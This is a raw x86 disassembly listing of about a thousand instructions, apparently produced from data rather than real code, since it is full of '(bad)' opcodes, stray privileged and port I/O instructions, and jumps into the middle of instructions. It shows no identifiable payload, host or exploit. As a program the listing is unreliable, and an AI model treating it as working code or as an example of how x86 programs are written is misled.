  40c586:	icebp  
  40c587:	sub    DWORD PTR [ebx-0x38],esp
  40c58a:	mov    eax,ds:0x4e2b0fe3
  40c58f:	imul   esi,DWORD PTR [ebx],0x61d42d6a
  40c595:	inc    eax
  40c596:	scas   eax,DWORD PTR es:[edi]
  40c597:	aas    
  40c598:	ds nop
  40c59a:	dec    ecx
  40c59b:	nop
  40c59c:	and    al,0x5b
  40c59e:	dec    edi
  40c59f:	sub    BYTE PTR [ebx],ah
  40c5a1:	mov    dl,0x7b
  40c5a3:	sbb    DWORD PTR [ecx+0x22e7ad45],ebx
  40c5a9:	scas   eax,DWORD PTR es:[edi]
  40c5aa:	jmp    0x40c552
  40c5ac:	jle    0x40c55e
  40c5ae:	dec    esi
  40c5af:	das    
  40c5b0:	jp     0x40c552
  40c5b2:	(bad)  
  40c5b3:	adc    al,0xab
  40c5b5:	cdq    
  40c5b6:	push   ds
  40c5b7:	bts    WORD PTR ds:0xcce1e2f2,bp
  40c5bf:	push   ss
  40c5c0:	addr16 and al,0xb4
  40c5c3:	inc    edx
  40c5c4:	jg     0x40c631
  40c5c6:	fwait
  40c5c7:	test   al,0xf3
  40c5c9:	cld    
  40c5ca:	in     eax,dx
  40c5cb:	(bad)  
  40c5cc:	mov    eax,ds:0x6972f291
  40c5d1:	push   esp
  40c5d2:	test   al,0xa0
  40c5d4:	cwde   
  40c5d5:	jecxz  0x40c58e
  40c5d7:	int3   
  40c5d8:	mov    esi,0x130230c8
  40c5dd:	inc    ebp
  40c5de:	out    dx,al
  40c5df:	sub    al,0xca
  40c5e1:	leave  
  40c5e2:	dec    esp
  40c5e3:	repnz hlt 
  40c5e5:	jne    0x40c5ba
  40c5e7:	imul   eax,ebx,0x4a
  40c5ea:	repnz pop DWORD PTR [ecx-0x4c]
  40c5ee:	adc    ebp,DWORD PTR [ebx+ecx*1]
  40c5f1:	sub    cl,BYTE PTR [edx+eax*4+0x5d]
  40c5f5:	fld    DWORD PTR [ecx-0x19445d6e]
  40c5fb:	inc    esp
  40c5fc:	les    edx,FWORD PTR [eax+0x5]
  40c5ff:	add    al,0x2d
  40c601:	pop    eax
  40c602:	mov    cl,0x9d
  40c604:	sub    esi,DWORD PTR [eax-0x8]
  40c607:	(bad)  
  40c608:	popa   
  40c609:	push   0xe0480797
  40c60e:	xchg   BYTE PTR [ebp*8-0xd85738f],bh
  40c615:	mov    dh,0xcc
  40c617:	icebp  
  40c618:	mov    ds:0xc631ea48,al
  40c61d:	iret   
  40c61e:	test   BYTE PTR [esi+eiz*1+0x99f6132],dl
  40c625:	xchg   esi,eax
  40c626:	(bad)  
  40c627:	nop
  40c628:	add    esi,DWORD PTR [eiz*4+0x733b0357]
  40c62f:	jmp    0x40c6a8
  40c631:	and    eax,DWORD PTR ds:0xa0494174
  40c637:	sti    
  40c638:	popf   
  40c639:	xchg   ebx,eax
  40c63a:	dec    edx
  40c63b:	loop   0x40c69c
  40c63d:	mov    bh,0x41
  40c63f:	cld    
  40c640:	arpl   WORD PTR [ebx-0x390afd9e],bx
  40c646:	cmp    dh,BYTE PTR [ecx]
  40c648:	inc    edx
  40c649:	ins    DWORD PTR es:[edi],dx
  40c64a:	mov    esi,0x284eb379
  40c64f:	lock xor DWORD PTR [esi+ecx*4],ebp
  40c653:	sbb    al,0xf0
  40c655:	sbb    edi,DWORD PTR [ebx-0x76bdb087]
  40c65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c65c:	mov    BYTE PTR [ebx+0x4b],ch
  40c65f:	mov    ds:0x6b312a2a,al
  40c664:	xchg   ebx,eax
  40c665:	cli    
  40c666:	imul   ebp,DWORD PTR [edx],0xffffffdb
  40c669:	out    0x3c,al
  40c66b:	jbe    0x40c6ab
  40c66d:	and    al,0xea
  40c66f:	int3   
  40c670:	jae    0x40c675
  40c672:	inc    BYTE PTR [ebx-0x16d79666]
  40c678:	into   
  40c679:	cmp    esi,DWORD PTR [eax-0x7b]
  40c67c:	(bad)  [eax+0x3abbd11c]
  40c682:	fdivr  DWORD PTR [edx+0xd977517]
  40c688:	xchg   esp,eax
  40c689:	dec    ebx
  40c68a:	repz xor BYTE PTR [ecx-0x4b],cl
  40c68e:	mov    esp,0x1f537bb1
  40c693:	mov    esi,0x1e8d09e5
  40c698:	test   esp,0xfceb3125
  40c69e:	mov    esp,0x444d7d34
  40c6a3:	icebp  
  40c6a4:	test   BYTE PTR [esi+edx*2],bl
  40c6a7:	pop    ecx
  40c6a8:	xor    al,BYTE PTR [ebp+eiz*1-0x4c3a5325]
  40c6af:	xor    al,0x6
  40c6b2:	in     eax,dx
  40c6b3:	dec    ecx
  40c6b4:	aam    0x5b
  40c6b6:	mov    ah,0x70
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c63f
  40c6bb:	xor    BYTE PTR [ebx+0x4ad2ce8d],ch
  40c6c1:	jmp    0xfcc1:0xfa081b3
  40c6c8:	aas    
  40c6c9:	or     DWORD PTR [eax+0x48],ecx
  40c6cc:	fild   DWORD PTR [ecx]
  40c6ce:	cmp    al,0x1d
  40c6d0:	jl     0x40c74b
  40c6d2:	push   0xf9efb0f
  40c6d7:	jns    0x40c66f
  40c6d9:	ins    DWORD PTR es:[edi],dx
  40c6da:	ins    DWORD PTR es:[edi],dx
  40c6db:	sar    DWORD PTR [edx],0x1f
  40c6de:	dec    edi
  40c6df:	rol    BYTE PTR [esi-0x7e6a9fb0],cl
  40c6e5:	inc    eax
  40c6e6:	push   esi
  40c6e7:	pop    es
  40c6e8:	mov    cl,0xf9
  40c6ea:	jb     0x40c737
  40c6ec:	mov    ebp,0xbab4b48f
  40c6f1:	out    dx,eax
  40c6f2:	and    eax,0x559d816a
  40c6f7:	scas   al,BYTE PTR es:[edi]
  40c6f8:	sbb    al,0x51
  40c6fa:	add    eax,0xe5f5465a
  40c6ff:	sub    ecx,eax
  40c701:	out    dx,eax
  40c702:	push   ebp
  40c703:	daa    
  40c704:	adc    edi,DWORD PTR [edx-0x64d362a2]
  40c70a:	(bad)  
  40c70b:	fs iret 
  40c70d:	adc    al,0xad
  40c70f:	pop    ds
  40c710:	or     al,0xd4
  40c712:	(bad)  
  40c713:	jae    0x40c6f0
  40c715:	shl    BYTE PTR [edx+0x3d],1
  40c718:	fwait
  40c719:	push   edx
  40c71a:	test   ecx,esp
  40c71c:	add    DWORD PTR [ecx+edi*1+0x31],edx
  40c720:	jmp    0x9cbd:0xf3be4643
  40c727:	push   0xb414ef6e
  40c72c:	and    eax,0xbb6876e7
  40c731:	lea    esi,[edx+esi*8]
  40c734:	cmp    BYTE PTR [eax-0x43b62729],ch
  40c73a:	stos   DWORD PTR es:[edi],eax
  40c73b:	sahf   
  40c73c:	mov    dl,ch
  40c73e:	sahf   
  40c73f:	sbb    ebp,esi
  40c741:	sub    bh,BYTE PTR [ecx-0x3f4d88e1]
  40c747:	mov    dh,0x5f
  40c749:	jle    0x40c788
  40c74b:	mov    bl,0x21
  40c74d:	rcr    BYTE PTR [esi+0x62],0xc1
  40c751:	imul   eax,esp,0xc
  40c754:	jnp    0x40c7d3
  40c756:	cld    
  40c757:	push   esi
  40c758:	repz add al,BYTE PTR [edi]
  40c75b:	sbb    BYTE PTR [ebx-0x997cae1],bl
  40c761:	dec    esi
  40c762:	xchg   ebx,eax
  40c763:	loope  0x40c76a
  40c765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c766:	shl    DWORD PTR [ecx],cl
  40c768:	mov    ds:0xf3000dcb,eax
  40c76d:	adc    al,0x9f
  40c76f:	les    esi,FWORD PTR [ecx]
  40c771:	popf   
  40c772:	jno    0x40c7a9
  40c774:	(bad)  
  40c775:	or     eax,0x99e83e05
  40c77a:	mov    ds,WORD PTR [ebx-0xa]
  40c77d:	sub    eax,0xfe7bcb80
  40c782:	cmc    
  40c783:	in     al,0xf9
  40c785:	sub    bl,dl
  40c787:	add    BYTE PTR [edx+0x5bb392a0],0xf1
  40c78e:	js     0x40c7e9
  40c790:	lea    esp,[esi+0x13cab3c1]
  40c796:	cli    
  40c797:	loope  0x40c78d
  40c799:	or     BYTE PTR [eax+0x330e6803],bl
  40c79f:	add    ah,BYTE PTR [edi]
  40c7a1:	daa    
  40c7a2:	pop    edx
  40c7a3:	in     eax,0x99
  40c7a5:	ds adc ecx,0x6c
  40c7a9:	jbe    0x40c77c
  40c7ab:	mov    DWORD PTR [ecx+edi*1+0x46593fb2],ebx
  40c7b2:	fsubrp st(4),st
  40c7b4:	inc    eax
  40c7b5:	out    0x7a,al
  40c7b7:	mov    ch,0xb1
  40c7b9:	les    eax,FWORD PTR [ebx+edi*1-0x6efe721e]
  40c7c0:	rcr    BYTE PTR [eax+0x7e],1
  40c7c3:	and    al,bh
  40c7c5:	push   es
  40c7c6:	ins    BYTE PTR es:[edi],dx
  40c7c7:	or     edx,DWORD PTR [ebp+edx*2+0x61]
  40c7cb:	pop    ebx
  40c7cc:	cmp    BYTE PTR [edx+edx*1],bh
  40c7cf:	pop    eax
  40c7d0:	push   ds
  40c7d1:	jge    0x40c7c7
  40c7d3:	adc    al,0x75
  40c7d5:	mov    al,BYTE PTR [ebx-0x35bcce44]
  40c7db:	pop    esp
  40c7dc:	mov    ebp,0xd0166305
  40c7e1:	dec    BYTE PTR [edx]
  40c7e3:	push   es
  40c7e4:	pop    ebp
  40c7e5:	in     eax,0x9d
  40c7e7:	(bad)  
  40c7e8:	mov    al,0x12
  40c7ea:	fstp   st(3)
  40c7ec:	jo     0x40c7bd
  40c7ee:	xor    cl,BYTE PTR [ecx-0x551ddc16]
  40c7f4:	neg    ecx
  40c7f6:	mov    bl,BYTE PTR [edi-0x2f]
  40c7f9:	mov    edx,0xa874d657
  40c7fe:	and    ah,BYTE PTR [ebx+eiz*1]
  40c801:	aaa    
  40c802:	jo     0x40c7aa
  40c804:	mov    ?,ecx
  40c806:	pop    edi
  40c807:	inc    ecx
  40c808:	sahf   
  40c809:	aaa    
  40c80a:	jbe    0x40c7f2
  40c80c:	inc    ebx
  40c80d:	not    BYTE PTR [ebx-0x4d]
  40c810:	cmc    
  40c811:	(bad)  fs:[edx]
  40c814:	aaa    
  40c815:	mov    esp,0xbeead6ac
  40c81a:	adc    cl,al
  40c81c:	imul   esi,esi,0xec81ad5e
  40c822:	out    dx,eax
  40c823:	mov    esi,DWORD PTR [edx-0x57]
  40c826:	xor    eax,0x79163926
  40c82b:	data16 fdivr DWORD PTR [edi+0x76f6b7a1]
  40c832:	dec    esp
  40c833:	xor    DWORD PTR es:[ecx+esi*2+0x4c],0x32
  40c839:	xor    cl,BYTE PTR ds:0xbb53157
  40c83f:	push   ecx
  40c840:	and    DWORD PTR [esi+0x28918d0b],esi
  40c846:	or     eax,0xe8bad7c5
  40c84b:	lock repz imul eax,DWORD PTR [ecx-0x5b],0x9b962b44
  40c854:	push   0x7e
  40c856:	jnp    0x40c82f
  40c858:	adc    dl,BYTE PTR [eax+0x23]
  40c85b:	out    0x15,eax
  40c85d:	std    
  40c85e:	inc    edi
  40c85f:	into   
  40c860:	push   ecx
  40c861:	inc    edi
  40c862:	sbb    BYTE PTR [eax-0x1427061c],ch
  40c868:	imul   esp,DWORD PTR [esi-0x2f],0x710608ed
  40c86f:	jmp    0x8672:0x7b06c058
  40c876:	pop    esp
  40c877:	mov    al,dh
  40c879:	lock xor esi,DWORD PTR [ebx-0x17dd390f]
  40c880:	ror    DWORD PTR [ecx+0x43],0x60
  40c884:	pop    edi
  40c885:	(bad)  
  40c886:	mov    ecx,0x27605ed3
  40c88b:	xchg   esi,eax
  40c88c:	mov    ds:0x6a10f01f,eax
  40c891:	pushf  
  40c892:	dec    edi
  40c893:	sahf   
  40c894:	push   edi
  40c895:	cmp    bh,BYTE PTR [edx]
  40c897:	mov    ebx,0xe3bda7ec
  40c89c:	adc    al,0xed
  40c89e:	mov    bl,0x2e
  40c8a0:	lock mov dl,0xea
  40c8a3:	aam    0xf7
  40c8a5:	sahf   
  40c8a6:	das    
  40c8a7:	jo     0x40c873
  40c8a9:	pop    ebp
  40c8aa:	and    al,0x90
  40c8ac:	arpl   WORD PTR [esi+0x7161d392],sp
  40c8b2:	les    ebp,FWORD PTR [ecx]
  40c8b4:	jbe    0x40c8bf
  40c8b6:	mov    esp,0x82a49fea
  40c8bb:	rcl    al,cl
  40c8bd:	dec    edi
  40c8be:	fnstenv [eax]
  40c8c0:	add    ch,BYTE PTR [eax-0x46b74c1f]
  40c8c6:	xor    eax,0x73341036
  40c8cb:	(bad)  
  40c8cc:	jae    0x40c8bb
  40c8ce:	test   eax,0x11e2b1e2
  40c8d3:	lods   al,BYTE PTR ds:[esi]
  40c8d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d5:	(bad)  
  40c8d6:	or     bh,BYTE PTR ds:[eax+eax*1-0x20]
  40c8db:	pop    es
  40c8dc:	xchg   ebx,eax
  40c8dd:	fiadd  DWORD PTR [ebp-0x17]
  40c8e0:	(bad)  
  40c8e1:	lock mov dh,0xb8
  40c8e4:	mov    ebx,0xab4c2cab
  40c8e9:	sub    eax,0x8b33e342
  40c8ee:	dec    esi
  40c8ef:	iret   
  40c8f0:	lods   eax,DWORD PTR ds:[esi]
  40c8f1:	xchg   bh,cl
  40c8f3:	add    DWORD PTR [eax+0x5ac8e32],esi
  40c8f9:	pop    ecx
  40c8fa:	fisubr WORD PTR [ecx-0x80]
  40c8fd:	retf   0x7ab
  40c900:	add    bl,BYTE PTR [edx+0x2ac84cc5]
  40c906:	add    bl,BYTE PTR [ebx]
  40c908:	xor    al,0xad
  40c90a:	int3   
  40c90b:	mov    al,ds:0xe04a0192
  40c910:	pop    eax
  40c911:	mov    esp,0x1f245889
  40c916:	repnz dec ecx
  40c918:	jo     0x40c965
  40c91a:	clc    
  40c91b:	xchg   esp,eax
  40c91c:	xchg   edx,eax
  40c91d:	leave  
  40c91e:	pop    esp
  40c91f:	push   ebx
  40c920:	bound  esp,QWORD PTR [eax-0x5c]
  40c923:	popf   
  40c924:	cs xchg edi,eax
  40c926:	addr16 es ja 0x40c968
  40c92a:	pop    edi
  40c92b:	(bad)  
  40c92c:	xor    bh,BYTE PTR [ebp-0x67]
  40c92f:	mov    edx,0xe6ed6a4c
  40c934:	fiadd  DWORD PTR [edi]
  40c936:	sub    BYTE PTR [eax+0x71e74859],dl
  40c93c:	jne    0x40c9a2
  40c93e:	jmp    0xb332f1ea
  40c943:	push   edx
  40c944:	ret    
  40c945:	shl    DWORD PTR [ecx],0x72
  40c948:	jbe    0x40c996
  40c94a:	push   eax
  40c94b:	outs   dx,DWORD PTR ds:[esi]
  40c94c:	push   eax
  40c94d:	sbb    DWORD PTR [eax+ebx*8+0x0],eax
  40c951:	inc    edi
  40c952:	shl    BYTE PTR [eax],0xc7
  40c955:	or     eax,0x302222af
  40c95a:	pushf  
  40c95b:	push   esi
  40c95c:	not    BYTE PTR [esp+edi*2-0x40]
  40c960:	in     eax,dx
  40c961:	ret    
  40c962:	sti    
  40c963:	bound  ebx,QWORD PTR [ebp-0x5144a932]
  40c969:	loopne 0x40c937
  40c96b:	jns    0x40c964
  40c96d:	mov    eax,ds:0x5e43b122
  40c972:	das    
  40c973:	les    edi,FWORD PTR [edx+ebx*2-0x45c83b3c]
  40c97a:	ins    BYTE PTR es:[edi],dx
  40c97b:	pop    ss
  40c97c:	ror    edx,1
  40c97e:	jmp    0x40c96c
  40c980:	test   DWORD PTR [edx+0x50ef125f],0xd1d74b8b
  40c98a:	ins    DWORD PTR es:[edi],dx
  40c98b:	xchg   ebp,eax
  40c98c:	mov    esp,0x48e51a5
  40c991:	and    ah,BYTE PTR [ecx]
  40c993:	int    0x75
  40c995:	call   0xfdbe090e
  40c99a:	sub    edx,ebx
  40c99c:	aaa    
  40c99d:	sub    eax,0x335951eb
  40c9a2:	xchg   esi,eax
  40c9a3:	in     eax,0x6
  40c9a5:	sub    eax,0x11273dae
  40c9aa:	cmp    al,0xe8
  40c9ac:	sbb    eax,0x93ff8eac
  40c9b1:	jo     0x40ca2b
  40c9b3:	inc    esi
  40c9b4:	push   0xfffffffe
  40c9b6:	ja     0x40c99d
  40c9b8:	or     eax,0xad8be165
  40c9bd:	test   DWORD PTR [esi-0x78],edi
  40c9c0:	push   ebx
  40c9c1:	dec    edx
  40c9c2:	loop   0x40c9a4
  40c9c4:	popa   
  40c9c5:	mov    ebp,0x1a7f6585
  40c9ca:	sbb    esi,DWORD PTR [ecx+0x6e845f56]
  40c9d0:	and    al,0x2c
  40c9d2:	mov    ebx,0xf1d20d7f
  40c9d7:	mov    DWORD PTR [edx],esp
  40c9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9da:	sub    ah,BYTE PTR [ebp-0x2d]
  40c9dd:	int    0x72
  40c9df:	mov    ah,BYTE PTR [edi]
  40c9e1:	mov    ecx,0xa54c639b
  40c9e6:	xchg   BYTE PTR [esi-0x68048d6d],cl
  40c9ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ed:	outs   dx,BYTE PTR ds:[esi]
  40c9ee:	es sub edx,ebx
  40c9f1:	xchg   ecx,eax
  40c9f2:	adc    ecx,DWORD PTR [eax-0x5b]
  40c9f5:	int    0xda
  40c9f7:	or     BYTE PTR [esi-0x7ca756bf],ch
  40c9fd:	idiv   esi
  40c9ff:	scas   eax,DWORD PTR es:[edi]
  40ca00:	dec    esi
  40ca01:	jecxz  0x40ca05
  40ca03:	aad    0x14
  40ca05:	jnp    0x40c98b
  40ca07:	mov    edx,eax
  40ca09:	mov    esi,0x4a40f4de
  40ca0e:	iret   
  40ca0f:	scas   eax,DWORD PTR es:[edi]
  40ca10:	cmp    ah,bl
  40ca12:	pusha  
  40ca13:	arpl   WORD PTR [ebp+0x3587f35e],si
  40ca19:	ret    0x72ae
  40ca1c:	mov    ecx,DWORD PTR [edx]
  40ca1e:	or     al,0x1e
  40ca20:	(bad)  
  40ca21:	adc    BYTE PTR [eax-0x697583e1],0x2e
  40ca28:	repnz mov esi,0xfd69dc07
  40ca2e:	pop    es
  40ca2f:	(bad)  [edi-0x45]
  40ca32:	cli    
  40ca33:	add    DWORD PTR [edx],edi
  40ca35:	into   
  40ca36:	leave  
  40ca37:	mov    al,ds:0x45d0e7a7
  40ca3c:	jp     0x40ca26
  40ca3e:	ds (bad) 
  40ca40:	jp     0x40ca6e
  40ca42:	push   eax
  40ca43:	loope  0x40c9c8
  40ca45:	xor    BYTE PTR [ebx],cl
  40ca47:	sbb    ebx,ebx
  40ca49:	add    BYTE PTR [ebp+0x48],bh
  40ca4c:	cdq    
  40ca4d:	rcr    DWORD PTR ds:0xcacd7339,1
  40ca53:	mov    edx,0x98761898
  40ca58:	sbb    ecx,DWORD PTR [ebx+ebp*2+0xc]
  40ca5c:	pop    edi
  40ca5d:	das    
  40ca5e:	test   DWORD PTR [edx],edx
  40ca60:	sub    al,0x89
  40ca62:	xchg   edx,eax
  40ca63:	push   ds
  40ca64:	bound  edx,QWORD PTR [ebp-0x28]
  40ca67:	mov    ds:0xbe5497ac,al
  40ca6c:	cli    
  40ca6d:	jmp    0x5092:0x6bb7a7c2
  40ca74:	ins    DWORD PTR es:[edi],dx
  40ca75:	lock jmp DWORD PTR [ebx+0x2333d22b]
  40ca7c:	std    
  40ca7d:	in     al,0xf
  40ca7f:	sub    eax,0x258772dd
  40ca84:	pop    edi
  40ca85:	shr    BYTE PTR [esi-0x33e4bfb8],0x20
  40ca8c:	ja     0x40ca72
  40ca8e:	add    BYTE PTR [edx+0x7c],0x44
  40ca92:	cmp    ch,dl
  40ca94:	je     0x40ca88
  40ca96:	sbb    al,BYTE PTR [edx]
  40ca98:	and    esi,DWORD PTR [edi+0x49dabb03]
  40ca9e:	cmp    BYTE PTR [esi+0x2f],al
  40caa1:	add    eax,0x9594960e
  40caa6:	sahf   
  40caa7:	lods   eax,DWORD PTR ds:[esi]
  40caa8:	cmp    DWORD PTR cs:[edi+eiz*2],edx
  40caac:	mov    bh,ah
  40caae:	mov    esp,0x9e5e4b50
  40cab3:	cli    
  40cab4:	fcomp  QWORD PTR [ebp+0x5a]
  40cab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab8:	xchg   esp,eax
  40cab9:	jae    0x40cb1d
  40cabb:	rcl    BYTE PTR [edx],cl
  40cabd:	arpl   WORD PTR [ecx+0x1cc6be94],di
  40cac3:	cmp    DWORD PTR [edx+0x78],0x11
  40cac7:	push   es
  40cac8:	sbb    dh,BYTE PTR [edx]
  40caca:	inc    edi
  40cacc:	cs or  al,0xce
  40cacf:	mov    dh,0xf5
  40cad1:	int3   
  40cad2:	imul   esp,ebx,0xcb17189a
  40cad8:	xor    bh,BYTE PTR [esi]
  40cada:	mov    edi,0xd43d00e2
  40cadf:	je     0x40cb0b
  40cae1:	ins    BYTE PTR es:[edi],dx
  40cae2:	xor    edi,ebp
  40cae4:	shl    DWORD PTR [ecx],cl
  40cae6:	push   ebp
  40cae7:	jle    0x40cb5c
  40cae9:	mov    esi,0xcec5a163
  40caee:	rcl    DWORD PTR [esi+0x59830978],0x5e
  40caf5:	xor    BYTE PTR [edi-0x5b],al
  40caf8:	mov    fs,WORD PTR [edx+0xa1f31b9]
  40cafe:	les    eax,FWORD PTR [eax]
  40cb00:	ds pop eax
  40cb02:	jp     0x40cad5
  40cb04:	sub    DWORD PTR [eax],ebx
  40cb06:	mov    eax,ds:0xbfd9ed5d
  40cb0b:	mov    edx,0xa20835c2
  40cb10:	sub    ah,BYTE PTR ds:0x87b1233
  40cb16:	ret    
  40cb17:	mov    al,0x65
  40cb19:	call   0x45e4:0x934ca32
  40cb20:	int3   
  40cb21:	mov    ds:0x93807c7d,al
  40cb26:	or     BYTE PTR [esi-0x28],0xfc
  40cb2a:	sub    ecx,ebp
  40cb2c:	inc    edx
  40cb2d:	test   ch,dh
  40cb2f:	xchg   edi,eax
  40cb30:	jmp    DWORD PTR [esi-0x12]
  40cb33:	inc    esp
  40cb34:	and    al,0x4f
  40cb36:	pop    ebx
  40cb37:	je     0x40cb1c
  40cb39:	dec    esp
  40cb3a:	mov    ds:0xd5339b47,eax
  40cb3f:	sbb    eax,0x38c3d6cd
  40cb44:	pop    ss
  40cb45:	mov    WORD PTR ds:0x520e67ba,gs
  40cb4b:	dec    ecx
  40cb4c:	into   
  40cb4d:	inc    ebp
  40cb4e:	inc    ebx
  40cb4f:	jmp    0x20efb53a
  40cb54:	and    DWORD PTR [ebx-0x14],0x7e3dd9d
  40cb5b:	stos   DWORD PTR es:[edi],eax
  40cb5c:	ficomp DWORD PTR [edx-0x50c8cdd4]
  40cb62:	jecxz  0x40cb0c
  40cb64:	or     cl,BYTE PTR [ecx-0x6d]
  40cb67:	sti    
  40cb68:	fnop   
  40cb6a:	push   cs
  40cb6b:	out    dx,eax
  40cb6c:	push   ss
  40cb6d:	lods   al,BYTE PTR ds:[esi]
  40cb6e:	add    dl,BYTE PTR [esi-0x21]
  40cb71:	sub    BYTE PTR [edx],dh
  40cb73:	mov    bl,BYTE PTR [eax+0x2f41cd1a]
  40cb79:	cmp    cl,BYTE PTR [edi-0x3fd673ff]
  40cb7f:	cs pop ss
  40cb81:	jge    0x40cb9f
  40cb83:	push   esi
  40cb84:	xlat   BYTE PTR ds:[ebx]
  40cb85:	jmp    0x67934d0b
  40cb8a:	jp     0x40cb79
  40cb8c:	mov    BYTE PTR [esi+0x11fb44d5],bh
  40cb92:	jnp    0x40cbb8
  40cb94:	imul   eax,DWORD PTR [ebx-0x13],0x26
  40cb98:	js     0x40cba8
  40cb9a:	lods   eax,DWORD PTR ds:[esi]
  40cb9b:	xor    DWORD PTR [ebp+0x251d7742],edx
  40cba1:	mov    eax,?
  40cba3:	sbb    bh,BYTE PTR [ecx]
  40cba5:	ja     0x40cb92
  40cba7:	xchg   ebp,eax
  40cba8:	sbb    cl,dh
  40cbaa:	xchg   esp,eax
  40cbab:	or     al,0x2b
  40cbad:	imul   edi,DWORD PTR [edx+0x6cc1bcdb],0x2a
  40cbb4:	jg     0x40cb7d
  40cbb6:	dec    ebp
  40cbb7:	stc    
  40cbb8:	imul   ebp,ebx,0x39f2b5b5
  40cbbe:	call   0xf4d6ca70
  40cbc3:	rcr    BYTE PTR ds:0x9bf29a95,cl
  40cbc9:	push   edi
  40cbca:	in     eax,dx
  40cbcb:	xchg   esp,eax
  40cbcc:	ficomp WORD PTR [ebx]
  40cbce:	jp     0x40cb5f
  40cbd0:	fadd   QWORD PTR [edi]
  40cbd2:	sbb    eax,0xa86c0fa1
  40cbd7:	mov    dh,0xfc
  40cbd9:	mov    ds:0x20b0e1ad,al
  40cbde:	int3   
  40cbdf:	stos   DWORD PTR es:[edi],eax
  40cbe0:	or     bl,cl
  40cbe2:	xchg   esi,eax
  40cbe3:	inc    edi
  40cbe4:	pop    esp
  40cbe5:	dec    ecx
  40cbe6:	dec    edx
  40cbe7:	stc    
  40cbe8:	outs   dx,DWORD PTR ds:[esi]
  40cbe9:	xchg   ecx,eax
  40cbea:	popf   
  40cbeb:	lea    ebx,[edx+0x6]
  40cbee:	and    DWORD PTR [edi-0x79],edx
  40cbf1:	(bad)  
  40cbf2:	dec    ebp
  40cbf3:	daa    
  40cbf4:	sbb    al,0xc6
  40cbf6:	jbe    0x40cb9e
  40cbf8:	mov    dh,0x37
  40cbfa:	sub    BYTE PTR [edi+0x517cef82],ch
  40cc00:	shl    bh,cl
  40cc02:	mov    esp,0x49b4c19d
  40cc07:	adc    esi,DWORD PTR [esi-0x4ed870cb]
  40cc0d:	fwait
  40cc0e:	xchg   ebp,eax
  40cc0f:	arpl   WORD PTR [edi+0x61],sp
  40cc12:	lock stc 
  40cc14:	lods   al,BYTE PTR ds:[esi]
  40cc15:	(bad)  
  40cc16:	inc    eax
  40cc17:	test   eax,0xdcbd8ca7
  40cc1c:	adc    DWORD PTR [ebx+0x67acf99f],esi
  40cc22:	into   
  40cc23:	xor    BYTE PTR [esi],ch
  40cc25:	inc    ebx
  40cc26:	xor    cl,cl
  40cc28:	and    eax,0xce3bfe6f
  40cc2d:	jns    0x40cbcc
  40cc2f:	fdiv   st,st(7)
  40cc31:	add    eax,0xc1309972
  40cc36:	mov    bl,BYTE PTR [edi]
  40cc38:	add    dl,BYTE PTR [ebx+eax*4]
  40cc3b:	mov    eax,0x5e557434
  40cc40:	lea    edi,[ecx+0x37b9e674]
  40cc46:	and    al,BYTE PTR [ebp+0xf]
  40cc49:	lea    edx,[esi+ecx*8]
  40cc4c:	and    BYTE PTR [ebx-0x21],0x5d
  40cc50:	sti    
  40cc51:	jg     0x40cbf9
  40cc53:	dec    esi
  40cc54:	jl     0x40cc21
  40cc56:	inc    edi
  40cc57:	(bad)  
  40cc58:	loope  0x40ccd1
  40cc5a:	popf   
  40cc5b:	hlt    
  40cc5c:	cmc    
  40cc5d:	mov    eax,ds:0x67450693
  40cc62:	or     eax,0x4ca6fe7
  40cc67:	xchg   esi,eax
  40cc68:	pop    es
  40cc69:	inc    ecx
  40cc6a:	jae    0x40ccc5
  40cc6c:	dec    eax
  40cc6d:	add    eax,0x5dc7a3e8
  40cc72:	rcl    dh,cl
  40cc74:	retf   
  40cc75:	mov    eax,0x63288717
  40cc7a:	mov    ebp,0x7c60176d
  40cc7f:	lea    ebp,[esi+eiz*4-0x22]
  40cc83:	out    0xe0,eax
  40cc85:	out    dx,eax
  40cc86:	push   ebp
  40cc87:	jl     0x40ccff
  40cc89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc8a:	or     esi,DWORD PTR [ebx-0x6029abd2]
  40cc90:	mov    ebx,0xe5e71a09
  40cc95:	jb     0x40cc67
  40cc97:	push   0x5bd38926
  40cc9c:	mov    edx,0x4d295bee
  40cca1:	iret   
  40cca2:	and    al,0xe9
  40cca4:	sbb    bl,BYTE PTR [ebx]
  40cca6:	xor    cl,BYTE PTR [edx+0x35]
  40cca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccaa:	jne    0x40cd10
  40ccac:	dec    eax
  40ccad:	cwde   
  40ccae:	(bad)  
  40ccaf:	iret   
  40ccb0:	aad    0xee
  40ccb2:	jns    0x40ccf7
  40ccb4:	mov    ch,0xb3
  40ccb6:	and    BYTE PTR [esi-0x2e28b6e2],bh
  40ccbc:	sbb    eax,0xa2839e4f
  40ccc1:	cwde   
  40ccc2:	or     al,0x5b
  40ccc4:	xchg   esp,eax
  40ccc5:	(bad)  
  40ccc6:	sub    DWORD PTR [ebp-0x570ade06],eax
  40cccc:	retf   
  40cccd:	cmp    BYTE PTR [bx-0x18],al
  40ccd1:	sbb    cl,BYTE PTR [esi-0x3]
  40ccd4:	pop    edx
  40ccd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccd6:	hlt    
  40ccd7:	xchg   edx,eax
  40ccd8:	xchg   ebx,eax
  40ccd9:	rcl    DWORD PTR [eax+0xe968724],0xa
  40cce0:	pop    eax
  40cce1:	retf   0x5352
  40cce4:	push   ecx
  40cce5:	inc    eax
  40cce6:	adc    al,0x59
  40cce8:	gs and esi,esi
  40cceb:	icebp  
  40ccec:	pop    ebx
  40cced:	mov    cl,0x1d
  40ccef:	inc    edx
  40ccf0:	sbb    DWORD PTR [eax+ebx*2+0x54e39fbd],0x1b
  40ccf8:	adc    eax,0xcff37587
  40ccfd:	xchg   ebp,eax
  40ccfe:	mov    dl,0xe1
  40cd00:	scas   al,BYTE PTR es:[edi]
  40cd01:	mov    dh,BYTE PTR [ebp-0x280c49af]
  40cd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd08:	js     0x40cc94
  40cd0a:	or     dh,ch
  40cd0c:	loop   0x40ccce
